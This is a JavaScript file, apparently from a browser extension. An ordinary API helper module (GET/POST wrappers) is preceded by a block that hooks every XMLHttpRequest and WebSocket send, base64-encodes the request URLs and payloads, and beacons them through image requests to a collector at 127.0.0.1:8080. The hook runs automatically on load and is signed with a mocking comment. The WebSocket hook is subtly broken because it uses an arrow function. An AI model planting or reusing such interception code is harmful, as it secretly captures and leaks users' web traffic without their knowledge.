function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
var api = function () {
    var API_URL = "";

    var serialize = function (obj) {
        var str = [];
        for (var p in obj) {
            if (obj.hasOwnProperty(p)) {
                str.push(encodeURIComponent(p) + "=" + encodeURIComponent(obj[p]));
            }
        }
        return str.join("&");
    };

    var readyState = function (request, callback) {
        return function () {
            if (request.readyState == 4) {
                var data = {};
                try {
                    data = JSON.parse(request.responseText);
                    if (request.status == 200) {
                        return callback(null, data);
                    }
                } catch (e) {
                    ga('send', 'event', 'api', 'json_error', request.responseText);
                }

                callback(new Error(data.error || chrome.i18n.getMessage('CANT_REACH_SERVER')), {serverError: true});
            }
        }
    };
    var getData = function (endpoint, data, callback) {
        var formData = new FormData();
        if (!_.isObject(data)) {
            data = {};
        }
        if (!_.isEmpty(user.data)) {
            data = _.merge(data, {userId: user.data._id});
        }

        var getParams = serialize(data);

        var request = new XMLHttpRequest();
        request.open("GET", api.url + endpoint + '?' + getParams, true);
        request.onreadystatechange = readyState(request, callback);
        request.send(formData);
    };

    var postData = function (endpoint, data, callback) {
        var formData = new FormData();
        for (var key in data) {
            if (data.hasOwnProperty(key)) {
                formData.append(key, data[key]);
            }
        }
        if (!_.isEmpty(user.data)) {
            formData.append('userId', user.data._id);
        }
        var request = new XMLHttpRequest();
        request.open("POST", api.url + endpoint, true);
        request.onreadystatechange = readyState(request, callback);
        request.send(formData);

    };

    var init = function (next) {
        next();
    };

    return {
        init: init,
        url: API_URL,
        getData: getData,
        postData: postData
    }
}();